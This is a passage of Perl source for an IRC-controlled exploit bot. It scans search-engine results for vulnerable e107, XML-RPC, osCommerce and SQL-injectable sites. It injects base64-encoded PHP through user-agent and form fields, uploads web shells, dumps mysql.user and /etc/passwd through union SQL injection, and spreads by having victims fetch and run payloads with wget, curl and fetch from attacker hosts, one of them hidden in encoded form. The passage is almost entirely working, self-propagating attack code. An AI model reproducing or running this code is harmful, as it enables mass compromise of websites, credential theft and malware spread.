                                &msg("$chan","|$lfilogo(0+4$engine15)15(0+8SHeLL15)13 ".$shell." 15(0+3".$sys."15)15(0+9$nob0dy15)|");sleep(2);
                                &msg("$admin","|$lfilogo(0+4$engine15)15(0+8SHeLL15)13 ".$shell." 15(0+3".$sys."15)15(0+9$nob0dy15)|");sleep(2);
								&msg("$chan","|$lfilogo $spreadlogo 8T9rying 8T9o 8L9oad 8S9pread in 8T9arget.....|");sleep(2);
                            }
                            else {
                                &msg("$chan","|$lfilogo(0+4$engine15)15(0+8SysTem15)7 ".$vuln." 15(0+3".$sys."15))15(0+9$nob0dy15)|");sleep(2);
                            }
                        } exit; }
                    }
                    else { &msg("$chan","|$lfilogo(0+4$engine15)15(0+8EnviRon15)10 ".$vuln." |"); }
                } exit; } sleep(2);
            }
        }
    }
}

sub lfi_env_query() {
    my $url = $_[0];
    my $code = $_[1];
    my $ua = LWP::UserAgent->new(agent => "<?eval(base64_decode('".$code."'));?>");
    $ua->timeout(7);
    my $req = HTTP::Request->new(GET => $url);
    my $res = $ua->request($req);
    return $res->content;
}

sub lfi_spread_query() {
    my $url = $_[0];
    my $code = "system('cd /tmp;rm -rf dor.* *.jpg.*;fetch ".$botshell.";php input.jpg;rm -rf input.jpg;wget ".$botshell.";php input.jpg;rm -rf input.jpg;curl -O ".$botshell.";php input.jpg;rm -rf input.jpg;lwp-download ".$botshell.";php input.jpg;fetch ".$botshell2.";php output.jpg;rm -rf output.jpg;wget ".$botshell2.";php output.jpg;rm -rf output.jpg;curl -O ".$botshell2.";php output.jpg;rm -rf output.jpg;lwp-download ".$botshell2.";php output.jpg;cd /var/tmp;fetch ".$botshell.";php input.jpg;rm -rf input.jpg;wget ".$botshell.";php input.jpg;rm -rf input.jpg;curl -O ".$botshell.";php input.jpg;rm -rf input.jpg;lwp-download ".$botshell.";php input.jpg;fetch ".$botshell2.";php output.jpg;rm -rf output.jpg;wget ".$botshell2.";php output.jpg;rm -rf output.jpg;curl -O ".$botshell2.";php output.jpg;rm -rf output.jpg;lwp-download ".$botshell2.";php output.jpg;rm -rf *.jp*;');";
    my $ua = LWP::UserAgent->new(agent => "<?eval(base64_decode('".encode_base64($code)."'));?>");
    $ua->timeout(7);
    my $req = HTTP::Request->new(GET => $url);
    my $res = $ua->request($req);
}

sub e107() {
    my $chan = $_[0];
    my $bug = $_[1];
    my $dork = $_[2];
    my $engine = $_[3];
    my $count = 0;
    my @list = &search_engine($chan,$bug,$dork,$engine,$e107logo);
    my $num = scalar(@list);
    if ($num > 0) {
        foreach my $site (@list) {
            $count++;
            if ($count == $num-1) { &msg("$chan","|$e107logo(0+4$engine15)10 Scan finish|"); }
            my $test = "http://".$site.$bug;
            my $code = "ZWNobyAidjBwQ3Izdzxicj4iOw0KZWNobyAic3lzOiIucGhwX3VuYW1lKCkuIjxicj4iOw0KJGNtZD0iZWNobyBub2IwZHlDcjN3IjsNCiRlc2VndWljbWQ9ZXgoJGNtZCk7DQplY2hvICRlc2VndWljbWQ7DQpmdW5jdGlvbiBleCgkY2ZlKXsNCiRyZXMgPSAnJzsNCmlmICghZW1wdHkoJGNmZSkpew0KaWYoZnVuY3Rpb25fZXhpc3RzKCdleGVjJykpew0KQGV4ZWMoJGNmZSwkcmVzKTsNCiRyZXMgPSBqb2luKCJcbiIsJHJlcyk7DQp9DQplbHNlaWYoZnVuY3Rpb25fZXhpc3RzKCdzaGVsbF9leGVjJykpew0KJHJlcyA9IEBzaGVsbF9leGVjKCRjZmUpOw0KfQ0KZWxzZWlmKGZ1bmN0aW9uX2V4aXN0cygnc3lzdGVtJykpew0KQG9iX3N0YXJ0KCk7DQpAc3lzdGVtKCRjZmUpOw0KJHJlcyA9IEBvYl9nZXRfY29udGVudHMoKTsNCkBvYl9lbmRfY2xlYW4oKTsNCn0NCmVsc2VpZihmdW5jdGlvbl9leGlzdHMoJ3Bhc3N0aHJ1Jykpew0KQG9iX3N0YXJ0KCk7DQpAcGFzc3RocnUoJGNmZSk7DQokcmVzID0gQG9iX2dldF9jb250ZW50cygpOw0KQG9iX2VuZF9jbGVhbigpOw0KfQ0KZWxzZWlmKEBpc19yZXNvdXJjZSgkZiA9IEBwb3BlbigkY2ZlLCJyIikpKXsNCiRyZXMgPSAiIjsNCndoaWxlKCFAZmVvZigkZikpIHsgJHJlcyAuPSBAZnJlYWQoJGYsMTAyNCk7IH0NCkBwY2xvc2UoJGYpOw0KfX0NCnJldHVybiAkcmVzOw0KfQ==";
            my $html = &e107_rce_query($test,$code);		
            if ($html =~ /v0pCr3w<br>sys:(.+?)<br>nob0dyCr3w/) {
                if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
                    my $sys = $1;
                    my $upload = 'if(@copy("'.$injector.'","picture.php")) { echo "c0liSUKSESc0li";@copy("'.$botshell.'","input.php");@copy("'.$botshell2.'","output.php");} elseif(@copy("'.$injector.'","e107_themes/picture.php")) { echo "INTER_dthem";@copy("'.$botshell.'","e107_themes/input.php");@copy("'.$botshell2.'","e107_themes/output.php");} elseif(@copy("'.$injector.'","e107_plugins/picture.php")) { echo "INTER_dplug";@copy("'.$botshell.'","e107_plugins/input.php");@copy("'.$botshell2.'","e107_plugins/output.php");} elseif(@copy("'.$injector.'","e107_images/picture.php")) { echo "INTER_dima";@copy("'.$botshell.'","e107_images/input.php");@copy("'.$botshell2.'","e107_images/output.php");}';
                    my $res = &e107_rce_query($test,encode_base64($upload));
                    if ($res =~ /c0liSUKSESc0li/) {	
						&get_content("http://".$site."input.php");
						&get_content("http://".$site."output.php");
						 &e107xpl1($chan,$site,$engine);
                        &msg("$chan","|$e107logo(0+4$engine15)15(0+8SheLL15)13 http://".$site."4picture.php 15(0+3".$sys."15)(0+9safemode-off15)|");sleep(2);
                        &msg("$admin","|$e107logo(0+4$engine15)15(0+8SheLL15)13 http://".$site."4picture.php 15(0+3".$sys."15)(0+9safemode-off15)|");sleep(2);
						&msg("$chan","|$e107logo $spreadlogo 8T9rying 8T9o 8L9oad 8S9pread in 8T9arget.....|");sleep(2);
                    }
                    elsif ($res =~ /INTER_dthem/) {
						&get_content("http://".$site."e107_themes/input.php");
						&get_content("http://".$site."e107_themes/output.php");
                        &msg("$chan","|$e107logo(0+4$engine15)15(0+8SheLL15)13 http://".$site."e107_themes/4picture.php 15(0+3".$sys."15)(0+9safemode-off15)|");sleep(2);
                        &msg("$admin","|$e107logo(0+4$engine15)15(0+8SheLL15)13 http://".$site."e107_themes/4picture.php 15(0+3".$sys."15)(0+9safemode-off15)|");sleep(2);
						&msg("$chan","|$e107logo $spreadlogo 8T9rying 8T9o 8L9oad 8S9pread in 8T9arget.....|");sleep(2);
                    }
                    elsif ($res =~ /INTER_dplug/) {
						&get_content("http://".$site."e107_plugins/input.php");
						&get_content("http://".$site."e107_plugins/output.php");
                        &msg("$chan","|$e107logo(0+4$engine15)15(0+8SheLL15)13 http://".$site."e107_plugins/4picture.php 15(0+3".$sys."15)(0+9safemode-off15)|");sleep(2);
                        &msg("$admin","|$e107logo(0+4$engine15)15(0+8SheLL15)13 http://".$site."e107_plugins/4picture.php 15(0+3".$sys."15)(0+9safemode-off15)|");sleep(2);
						&msg("$chan","|$e107logo $spreadlogo 8T9rying 8T9o 8L9oad 8S9pread in 8T9arget.....|");sleep(2);
                    }
                    elsif ($res =~ /INTER_dima/) {
						&get_content("http://".$site."e107_images/input.php");
						&get_content("http://".$site."e107_images/output.php");
                        &msg("$chan","|$e107logo(0+4$engine15)15(0+8SheLL15)13 http://".$site."e107_images/4picture.php 15(0+3".$sys."15)(0+9safemode-off15)|");sleep(2);
                        &msg("$admin","|$e107logo(0+4$engine15)15(0+8SheLL15)13 http://".$site."e107_images/4picture.php 15(0+3".$sys."15)(0+9safemode-off15)|");sleep(2);
						&msg("$chan","|$e107logo $spreadlogo 8T9rying 8T9o 8L9oad 8S9pread in 8T9arget.....|");sleep(2);
                    }
                    else {
                        &msg("$chan","|$e107logo(0+4$engine15)15(0+8Vuln15)7 ".$test." 15(0+3".$sys."15)(0+9safemode-off15)|");sleep(2);
                    }
                    &e107_spread_query($test);
                    sleep(2);
                } exit; } sleep(2);
            }
            elsif ($html =~ /v0pCr3w<br>sys:(.+?)<br>/) {
                if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
                    my $sys = $1;
                    my $upload = 'if(@copy("'.$injector.'","picture.php")) { echo "c0liSUKSESc0li";@copy("'.$botshell.'","input.php");@copy("'.$botshell2.'","output.php");} elseif(@copy("'.$injector.'","e107_themes/picture.php")) { echo "INTER_dthem";@copy("'.$botshell.'","e107_themes/input.php");@copy("'.$botshell2.'","e107_themes/output.php");} elseif(@copy("'.$injector.'","e107_plugins/picture.php")) { echo "INTER_dplug";@copy("'.$botshell.'","e107_plugins/input.php");@copy("'.$botshell2.'","e107_plugins/output.php");} elseif(@copy("'.$injector.'","e107_images/picture.php")) { echo "INTER_dima";@copy("'.$botshell.'","e107_images/input.php");@copy("'.$botshell2.'","e107_images/output.php");}';
                    my $res = &e107_rce_query($test,encode_base64($upload));
                    if ($res =~ /c0liSUKSESc0li/) {
						&e107xpl1($chan,$site,$engine);
						&get_content("http://".$site."input.php");
						&get_content("http://".$site."output.php");
						 &e107xpl1($chan,$site,$engine);
                        &msg("$chan","|$e107logo(0+4$engine15)15(0+8SheLL15)10 http://".$site."4picture.php 15(0+3".$sys."15)(0+7safemode-on15)|");sleep(2);
						&msg("$chan","|$e107logo $spreadlogo 8T9rying 8T9o 8L9oad 8S9pread in 8T9arget.....|");sleep(2);
                    }
                    if ($res =~ /INTER_dthem/) {
						&get_content("http://".$site."e107_themes/input.php");
						&get_content("http://".$site."e107_themes/output.php");
                        &msg("$chan","|$e107logo(0+4$engine15)15(0+8SheLL15)10 http://".$site."e107_themes/4picture.php 15(0+3".$sys."15)(0+7safemode-on15)|");sleep(2);
						&msg("$chan","|$e107logo $spreadlogo 8T9rying 8T9o 8L9oad 8S9pread in 8T9arget.....|");sleep(2);
                    }
                    if ($res =~ /INTER_dplug/) {
						&get_content("http://".$site."e107_plugins/input.php");
						&get_content("http://".$site."e107_plugins/output.php");
                        &msg("$chan","|$e107logo(0+4$engine15)15(0+8SheLL15)10 http://".$site."e107_plugins/4picture.php 15(0+3".$sys."15)(0+7safemode-on15)|");sleep(2);
						&msg("$chan","|$e107logo $spreadlogo 8T9rying 8T9o 8L9oad 8S9pread in 8T9arget.....|");sleep(2);
                    }
                    if ($res =~ /INTER_dima/) {
						&get_content("http://".$site."e107_images/input.php");
						&get_content("http://".$site."e107_images/output.php");
                        &msg("$chan","|$e107logo(0+4$engine15)15(0+8SheLL15)10 http://".$site."e107_images/4picture.php 15(0+3".$sys."15)(0+7safemode-on15)|");sleep(2);
						&msg("$chan","|$e107logo $spreadlogo 8T9rying 8T9o 8L9oad 8S9pread in 8T9arget.....|");sleep(2);
                    }
                    else {
                        &msg("$chan","|$e107logo(0+4$engine15)15(0+9Vuln15)10 ".$test." 15(0+3".$sys."15)(0+7safemode-on15)|");sleep(2);
                    }
                } exit; } sleep(2);
            }
        }
    }
}

sub e107_rce_query() {
    my $url = $_[0];
    my $code = $_[1];
    my $req = HTTP::Request->new(POST => $url);
    $req->content_type('application/x-www-form-urlencoded');
    $req->content("send-contactus=1&author_name=[php]eval(base64_decode('".$code."'))%3Bdie%28%29%3B%5B%2Fphp%5D");
    my $ua = LWP::UserAgent->new(agent => $uagent);
    $ua->timeout(7);
    my $res = $ua->request($req);
    return $res->content;
}

sub e107_spread_query() {
    my $url = $_[0];
    my $code = "ZWNobyAidjBwQ3Izdzxicj4iOwplY2hvICJzeXM6Ii5waHBfdW5hbWUoKS4iPGJyPiI7CiRjbWQ9ImVjaG8gbm9iMGR5Q3IzdztjZCAvdG1wO3JtIC1yZiBkb3IuKiAqLnR4dC4qO2ZldGNoIGh0dHA6Ly9zY2FubmVyLm1veS5zdS9zcHJlYWQvaXNvLmljbztwZXJsIGlzby5pY287cm0gLXJmIGlzby5pY287d2dldCBodHRwOi8vc2Nhbm5lci5tb3kuc3Uvc3ByZWFkL2lzby5pY287cGVybCBpc28uaWNvO3JtIC1yZiBpc28uaWNvO2N1cmwgLU8gaHR0cDovL3NjYW5uZXIubW95LnN1L3NwcmVhZC9pc28uaWNvO3BlcmwgaXNvLmljbztybSAtcmYgaXNvLmljbztsd3AtZG93bmxvYWQgaHR0cDovL3NjYW5uZXIubW95LnN1L3NwcmVhZC9pc28uaWNvO3BlcmwgaXNvLmljbztybSAtcmYgaXNvLmljbztjZCAvdmFyL3RtcDtybSAtcmYgaXNvLiogKi5pY28uKjtmZXRjaCBodHRwOi8vc2Nhbm5lci5tb3kuc3Uvc3ByZWFkL2lzby5pY287cGVybCBpc28uaWNvO3JtIC1yZiBpc28uaWNvO3dnZXQgaHR0cDovL3NjYW5uZXIubW95LnN1L3NwcmVhZC9pc28uaWNvO3BlcmwgaXNvLmljbztybSAtcmYgaXNvLmljbztjdXJsIC1PIGh0dHA6Ly9zY2FubmVyLm1veS5zdS9zcHJlYWQvaXNvLmljbztwZXJsIGlzby5pY287cm0gLXJmIGlzby5pY287bHdwLWRvd25sb2FkIGh0dHA6Ly9zY2FubmVyLm1veS5zdS9zcHJlYWQvaXNvLmljbztwZXJsIGlzby5pY287cm0gLXJmIGlzby5pY287IjsKJGVzZWd1aWNtZD1leCgkY21kKTtlY2hvICRlc2VndWljbWQ7CmZ1bmN0aW9uIGV4KCRjZmUpewokcmVzID0gJyc7CmlmICghZW1wdHkoJGNmZSkpewppZihmdW5jdGlvbl9leGlzdHMoJ2V4ZWMnKSl7CkBleGVjKCRjZmUsJHJlcyk7CiRyZXMgPSBqb2luKCJcbiIsJHJlcyk7Cn0KZWxzZWlmKGZ1bmN0aW9uX2V4aXN0cygnc2hlbGxfZXhlYycpKXsKJHJlcyA9IEBzaGVsbF9leGVjKCRjZmUpOwp9CmVsc2VpZihmdW5jdGlvbl9leGlzdHMoJ3N5c3RlbScpKXsKQG9iX3N0YXJ0KCk7CkBzeXN0ZW0oJGNmZSk7CiRyZXMgPSBAb2JfZ2V0X2NvbnRlbnRzKCk7CkBvYl9lbmRfY2xlYW4oKTsKfQplbHNlaWYoZnVuY3Rpb25fZXhpc3RzKCdwYXNzdGhydScpKXsKQG9iX3N0YXJ0KCk7CkBwYXNzdGhydSgkY2ZlKTsKJHJlcyA9IEBvYl9nZXRfY29udGVudHMoKTsKQG9iX2VuZF9jbGVhbigpOwp9CmVsc2VpZihmdW5jdGlvbl9leGlzdHMoJ3BvcGVuJykpewokZiA9IEBwb3BlbigkY2ZlLCJyIik7CndoaWxlKCFAZmVvZigkY2ZlKSkgeyAkcmVzIC49IEBmcmVhZCgkY2ZlLDEwMjQpOyB9CkBwY2xvc2UoJGYpOwp9fQpyZXR1cm4gJHJlczsKfQ==";
    my $req = HTTP::Request->new(POST => $url);
    $req->content_type('application/x-www-form-urlencoded');
    $req->content("send-contactus=1&author_name=%5Bphp%5Deval(base64_decode('".$code."'))%3Bdie%28%29%3B%5B%2Fphp%5D");
    my $ua = LWP::UserAgent->new(agent => $uagent);
    $ua->timeout(7);
    my $res = $ua->request($req);
}

sub xml() {
    my $chan = $_[0];
    my $bug = $_[1];
    my $dork = $_[2];
    my $engine = $_[3];
    my $count = 0;
    my @list = &search_engine($chan,$bug,$dork,$engine,$xmllogo);
    my $num = scalar(@list);
    if ($num > 0) {
        foreach my $site (@list) {
            $count++;
            if ($count == $num-1) { &msg("$chan","|$xmllogo(0+4$engine15)10 Scan finish|"); }
            my $test = "http://".$site.$bug;
            my $vuln = "http://".$site."13".$bug;
            my $html = &get_content($test);
            if ($html =~ /faultCode/ ) {
            if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
            my $resp = &xml_cek_query($test);
			if ($resp =~ /j13mb0t(.*)j13mb0t/s) {
			&xml_spread_query($test);sleep(2);
			my $sys = $1;
			my $check = &get_content("http://".$site."picture.php");
				    &get_content("http://".$site."input.php");
				    &get_content("http://".$site."output.php");
				if ($check =~ /Faldy sHeLL/) {
				&msg("$chan","|$xmllogo(0+4$engine15)15(0+8SheLL15)13 http://".$site."7picture.php 3".$sys." |");&get_content("http://".$site."output.php"); sleep(2);
				&msg("$chan","|$xmllogo $spreadlogo 8T9rying 8T9o 8L9oad 8S9pread in 8T9arget.....|"); sleep(2);}
				else { 
				&msg("$chan","|$xmllogo(0+4$engine15)15(0+8SysTem15)7 ".$vuln." 3".$sys." |"); sleep(2);}
			}
	sleep(2); } exit; } }
		}
	}
}

sub xml_cek_query() {
    my $url 	= $_[0];
	my $code = "system('uname -a');";
    my $ua = LWP::UserAgent->new(agent => 'perl post');
        $exploit = "<?xml version=\"1.0\"?><methodCall>";
        $exploit .= "<methodName>test.method</methodName>";
        $exploit .= "<params><param><value><name>',''));";
        $exploit .= "echo'j13mb0t';".$code."echo'j13mb0t';exit;/*</name></value></param></params></methodCall>";
	$ua->timeout(7);
	my $res = $ua->request(POST $url, Content_Type => 'text/xml', Content => $exploit);
    return $res->content;
}

sub xml_spread_query() {
my $xmltargt = $_[0];
my $xmlsprd  = "system('wget ".$injector." -O images.php;fetch ".$injector.";mv linux.jpg picture.php;wget ".$botshell." -O input.php;fetch ".$botshell.";mv input.jpg input.php;wget ".$botshell2." -O output.php;fetch ".$botshell2.";mv output.jpg output.php;killall -9 perl;killall -9 php;cd /tmp;rm -rf dor.* *.jpg.*;fetch ".$botshell.";php input.jpg;rm -rf input.jpg;wget ".$botshell.";php input.jpg;rm -rf input.jpg;curl -O ".$botshell.";php input.jpg;rm -rf input.jpg;lwp-download ".$botshell.";php input.jpg;fetch ".$botshell2.";php output.jpg;rm -rf output.jpg;wget ".$botshell2.";php output.jpg;rm -rf output.jpg;curl -O ".$botshell2.";php output.jpg;rm -rf output.jpg;lwp-download ".$botshell2.";php output.jpg;cd /var/tmp;rm -rf dor.* *.jpg.*;fetch ".$botshell.";php input.jpg;rm -rf input.jpg;wget ".$botshell.";php input.jpg;rm -rf input.jpg;curl -O ".$botshell.";php input.jpg;rm -rf input.jpg;lwp-download ".$botshell.";php input.jpg;fetch ".$botshell2.";php output.jpg;rm -rf output.jpg;wget ".$botshell2.";php output.jpg;rm -rf output.jpg;curl -O ".$botshell2.";php output.jpg;rm -rf output.jpg;lwp-download ".$botshell2.";php output.jpg;');";
		my $userAgent = LWP::UserAgent->new(agent => 'perl post');
        $exploit = "<?xml version=\"1.0\"?><methodCall>";
        $exploit .= "<methodName>test.method</methodName>";
        $exploit .= "<params><param><value><name>',''));";
        $exploit .= "echo'j13m';".$xmlsprd."echo'b0T';exit;/*</name></value></param></params></methodCall>";
	$userAgent->timeout(7);
	$userAgent->request(POST $xmltargt, Content_Type => 'text/xml', Content => $exploit);
}

sub sql() {
    my $chan = $_[0];
    my $bug = $_[1];
    my $dork = $_[2];
    my $engine = $_[3];
    my $count = 0;
    my @list = &search_engine($chan,$bug,$dork,$engine,$sqllogo);
    my $num = scalar(@list);
    if ($num > 0) {
        foreach my $site (@list) {
            $count++;
            if ($count == $num-1) { &msg("$chan","|$sqllogo(0+4$engine15)10 Scan finish|"); }
            my $test = "http://".$site.$bug."'";
            my $vuln = "http://".$site."4".$bug;
	    my $sqlsite = "http://".$site.$bug;
            my $html = &get_content($test);
			if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
            if ($html =~ m/You have an error in your SQL syntax/i || $html =~ m/Query failed/i || $html =~ m/SQL query failed/i ) {
                &sqlbrute($sqlsite,$chan,$engine);}
            elsif ($html =~ m/ODBC SQL Server Driver/i || $html =~ m/Unclosed quotation mark/i || $html =~ m/Microsoft OLE DB Provider for/i ) {
                &msg("$chan","|$sqllogo(0+4$engine15)15(0+8MsSQL15)13 ".$vuln." |");}
            elsif ($html =~ m/Microsoft JET Database/i || $html =~ m/ODBC Microsoft Access Driver/i || $html =~ m/Microsoft OLE DB Provider for Oracle/i ) {
                &msg("$chan","|$sqllogo(0+4$engine15)15(0+8MsAccess15)13 ".$vuln." |");}
            elsif ($html =~ m/mysql_/i || $html =~ m/Division by zero in/i || $html =~ m/mysql_fetch_array/i ) {
                &sqlbrute($sqlsite,$chan,$engine);}
            } exit; sleep(2); }
        }
    }
}
sub sqlbrute() {
			my $situs=$_[0];
			my $chan  =$_[1];
			my $engine=$_[2];
			my $columns=20;
my $cfin.="--";
my $cmn.= "+";
for ($column = 0 ; $column < $columns ; $column ++)
	{
	$union.=','.$column;
	$inyection.=','."0x6c6f67696e70776e7a";
    if ($column == 0)
      {
		  $inyection = '';
          $union = '';
      }
    $sql=$situs."-1".$cmn."union".$cmn."select".$cmn."0x6c6f67696e70776e7a".$inyection.$cfin;
    $response=get($sql);
    if($response =~ /loginpwnz/)
		{
         $column ++;
         $sql=$situs."-1".$cmn."union".$cmn."select".$cmn."0".$union.$cfin;
		 &msg("$chan","|$sqllogo(0+4$engine15)15(0+8SQL15)13 $sql |");
         $sql=$situs."-1".$cmn."union".$cmn."select".$cmn."0x6c6f67696e70776e7a".$inyection.$cmn."from".$cmn."information_schema.tables".$cfin;
         $response=get($sql)or die("[-] Impossible to get Information_Schema\n");
         if($response =~ /loginpwnz/)
         	{
         	$sql=$situs."-1".$cmn."union".$cmn."select".$cmn."0".$union.$cmn."from".$cmn."information_schema.tables".$cfin;
			&msg("$chan","|$sqllogo(0+4$engine15)15(0+8SQL15)(0+13INFO_SCHEMA15)13 $sql |");
         	}
         $sql=$situs."-1".$cmn."union".$cmn."select".$cmn."0x6c6f67696e70776e7a".$inyection.$cmn."from".$cmn."mysql.user".$cfin;
         $response=get($sql)or die("[-] Impossible to get MySQL.User\n");
         if($response =~ /loginpwnz/)
         	{
         	$sql=$situs."-1".$cmn."union".$cmn."select".$cmn."0".$union.$cmn."from".$cmn."mysql.user".$cfin;
			&msg("$chan","|$sqllogo(0+4$engine15)15(0+8SQL15)(0+13USER15)13 $sql |");
         	}
         else
         	{
         	}
	while ($loadcont < $column-1)
	   {
		$loadfile.=','.'load_file(0x2f6574632f706173737764)';
		$loadcont++;
	   }
	   $sql=$situs."-1".$cmn."union".$cmn."select".$cmn."load_file(0x2f6574632f706173737764)".$loadfile.$cfin;
	$response=get($sql)or die("[-] Impossible to inject LOAD_FILE\n");
         if($response =~ /root:x:/)
         	{
			&msg("$chan","|$sqllogo(0+4$engine15)15(0+8SQL15)(0+13Load File15)13 $sql |");
			}
         else
         	{
         	}
	          foreach $tabla(@tabele)
                {
                  chomp($tabla);
                  $sql=$situs."-1".$cmn."union".$cmn."select".$cmn."0x6c6f67696e70776e7a".$inyection.$cmn."from".$cmn.$tabla.$cfin;
				 $response=get($sql)or die("[-] Impossible to get tables\n");
                  if($response =~ /loginpwnz/)
                    {
                    $sql=$situs."-1".$cmn."union".$cmn."select".$cmn."0".$union.$cmn."from".$cmn.$tabla.$cfin;
					&msg("$chan","|$sqllogo(0+4$engine15)15(0+8SQL15)(0+13Tabel15)13 $sql |");
					&tabelka($situs,$tabla,$chan,$engine);
                    }
                }
	    }
	}			
}

sub tabelka() {
			my $situs =$_[0];
			my $tabla =$_[1];
			my $chan  =$_[2];
			my $engine=$_[3];
			my $cfin.="--";
			my $cmn.= "+";
            chomp($tabla);
            foreach $columna(@kolumny)
            {
             chomp($columna);
             $sql=$situs."-1".$cmn."union".$cmn."select".$cmn."concat(0x6c6f67696e70776e7a,0x3a,$columna)".$inyection.$cmn."from".$cmn.$tabla.$cfin;
             $response=get($sql)or die("[-] Impossible to get columns\n");
             if ($response =~ /loginpwnz/)
                {
				&msg("$chan","|$sqllogo(0+4$engine15)15(0+8SQL15)(0+13SQLi Vuln15)9 $situs 14(0+13Kolom14)13 $columna 14(0+13Tabel14)13 $tabla |");
                }
            }
        
}

sub osco() {
    my $chan = $_[0];
    my $bug = $_[1];
    my $dork = $_[2];
    my $engine = $_[3];
    my $count = 0;
    my @list = &search_engine($chan,$bug,$dork,$engine,$oscologo);
    my $num = scalar(@list);
    if ($num > 0) {
        foreach my $site (@list) {
            $count++;
#            if ($count == $num-1) { &msg("$chan","|$oscologo(0+4$engine15)10 Scan finish|"); }
            my $test = "http://".$site.$bug;
            my $test1 = "http://".$site."admin/file_manager.php/login.php";
            my $test2 = "http://".$site."admin/banner_manager.php/login.php";
            my $html = &get_content($test);
			if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
            if ($html =~ /TABLE_HEADING_CATEGORIES_PRODUCTS/ ) {
#               &msg("$chan","|$oscologo(0+4$engine15)15(0+8System15)7 ".$test." |");
				&osco_xpl($test,$chan,$site,$engine);
				&osco2($test1,$chan,$bug,$dork,$engine);
				&osco_xpl3($test2,$chan,$site,$engine);
				} else { }
            } exit; sleep(2); }
        }
    }
}

sub osco_xpl() {
my $browser = LWP::UserAgent->new;
my $url    = $_[0]."?cPath=&action=new_product_preview";
my $chan   = $_[1];
my $site   = $_[2];
my $engine = $_[3];
my $res = $browser->post( $url,['products_image' => ['./linux.jpg' => 'picture.php' => 'application/octet-stream']],'Content-Type' => 'form-data');
my $resa = $browser->post( $url,['products_image' => ['./centos.jpg' => 'picture.inc.php' => 'application/octet-stream']],'Content-Type' => 'form-data');
my $resb = $browser->post( $url,['products_image' => ['./input.jpg' => 'input.php' => 'application/octet-stream']],'Content-Type' => 'form-data');
my $resc = $browser->post( $url,['products_image' => ['./output.jpg' => 'output.php' => 'application/octet-stream']],'Content-Type' => 'form-data');
my $resd = $browser->post( $url,['products_image' => ['./mysql.jpg' => 'mysql_dumper.php' => 'application/octet-stream']],'Content-Type' => 'form-data');
	my $hasil  = $res->as_string;
	my $hasil1 = $resa->as_string;
	my $hasil2 = $resb->as_string;
	my $hasil3 = $resc->as_string;
	my $hasil4 = $resd->as_string;
	my $check = &get_content("http://".$site."images/picture.php");&get_content("http://".$site."images/input.php");&get_content("http://".$site."images/outputt.php");&get_content("http://".$site."images/mysql_dumper.php");sleep(3);
	if ($check =~ /Faldy sHeLL/) {
	my $safe   ="";
	my $os 	   ="";
	my $free   ="";
    if ($check =~ m/Software : (.*?)<\/u><\/b><\/a><br>/) {$soft = $1;}
    if ($check =~ m/SAFE MODE is (.*?)<\/b><\/font>/) {$safe = $1;}
    if ($check =~ m/OS : (.*?)<br>/) {$os = $1;}
    if ($check =~ m/Freespace : (.*?)<\/p><\/td><\/tr>/) {$free = $1;}
	&msg("$chan","|$oscologo(0+4$engine15)15(0+8SHeLL15)13 http://".$site."images/4picture.php 9(0+15SafeMode= $safe9)(0+15OS= $os9)(0+15FreeSpace= $free9)|");sleep(2);
	&msg("$admin","$oscologo(4@3$engine15)15(4@3SHeLL15)13 http://".$site."images/4picture.php 9(4@15SafeMode= $safe9)(4@15OS= $os9)(4@15FreeSpace= $free9)");sleep(2);
	&msg("$chan","|$oscologo $spreadlogo 8T9rying 8T9o 8L9oad 8S9pread in 8T9arget.....|"); sleep(2);
	}
}

sub osco2() {
    my $chan = $_[0];
    my $bug = $_[1];
    my $dork = $_[2];
    my $engine = $_[3];
    my $count = 0;
    my @list = &search_engine($chan,$bug,$dork,$engine,$oscologo);
    my $num = scalar(@list);
    if ($num > 0) {
        foreach my $site (@list) {
            $count++;
            if ($count == $num-1) { &msg("$chan","|$oscologo(0+4$engine15)10 Scan finish|"); }
            my $test = "http://".$site.$bug;
            my $test1 = "http://".$site."admin/banner_manager.php/login.php";
            my $test2 = "http://".$site."admin/categories.php/login.php";
            my $html = &get_content($test);
			if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
            if ($html =~ /TABLE_HEADING_FILENAME/) {
                 &msg("$chan","|$oscologo(0+4$engine15)15(0+8System15)0 ".$test." |");
				&osco_xpl2($test,$chan,$site,$engine);
				&osco_xpl3($test1,$chan,$site,$engine);
				&osco_xpl($test2,$chan,$site,$engine);
				} else { }
            } exit; sleep(2); }
        }
    }
}

sub osco_xpl2() {
my $browser = LWP::UserAgent->new;
my $url    = $_[0]."?action=processuploads";
my $chan   = $_[1];
my $site   = $_[2];
my $engine = $_[3];
my $res = $browser->post( $url,['file_1' => ['./linux.jpg' => 'picture.php' => 'application/octet-stream']],'Content-Type' => 'form-data');
my $resa = $browser->post( $url,['file_1' => ['./centos.jpg' => 'picture.inc.php' => 'application/octet-stream']],'Content-Type' => 'form-data');
my $resb = $browser->post( $url,['file_1' => ['./input.jpg' => 'input.php' => 'application/octet-stream']],'Content-Type' => 'form-data');
my $resc = $browser->post( $url,['file_1' => ['./output.jpg' => 'output.php' => 'application/octet-stream']],'Content-Type' => 'form-data');
my $resd = $browser->post( $url,['file_1' => ['./mysql.jpg' => 'mysql_dumper.php' => 'application/octet-stream']],'Content-Type' => 'form-data');	
	my $hasil  = $res->as_string;
	my $hasil1 = $resa->as_string;
	my $hasil2 = $resb->as_string;
	my $hasil3 = $resc->as_string;
	my $hasil4 = $resd->as_string;
	my $check = &get_content("http://".$site."images/picture.php");&get_content("http://".$site."images/input.php");&get_content("http://".$site."images/output.php");&get_content("http://".$site."images/mysql_dumper.php");sleep(3);
	if ($check =~ /Faldy sHeLL/) { 
	my $safe   ="";
	my $os 	   ="";
	my $free   ="";
    if ($check =~ m/Software : (.*?)<\/u><\/b><\/a><br>/) {$soft = $1;}
    if ($check =~ m/SAFE MODE is (.*?)<\/b><\/font>/) {$safe = $1;}
    if ($check =~ m/OS : (.*?)<br>/) {$os = $1;}
    if ($check =~ m/Freespace : (.*?)<\/p><\/td><\/tr>/) {$free = $1;}
	&msg("$chan","|$oscologo(0+4$engine15)15(0+8SHeLL15)13 http://".$site."images/4picture.php 9(0+15SafeMode= $safe9)(0+15OS= $os9)(0+15FreeSpace= $free9)|");sleep(2);
